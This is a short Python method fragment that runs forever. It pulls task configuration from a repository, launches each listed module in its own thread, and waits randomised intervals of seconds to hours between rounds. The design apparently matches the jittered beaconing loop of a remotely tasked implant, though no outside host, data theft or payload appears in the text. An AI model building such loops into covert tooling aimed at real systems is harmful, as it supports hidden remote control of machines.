def run(self):
        while True:
            config = self.get_config()  # Get the configuration from the repository
            for task in config:
                # For each task in the configuration, run the module in a new thread
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                thread.start()
                # Random sleep time between 1 to 10 seconds before starting the next task
                time.sleep(random.randint(1, 10))
            # Random sleep time between 30 minutes to 3 hours before repeating the process
            time.sleep(random.randint(30*60, 3*60*60))
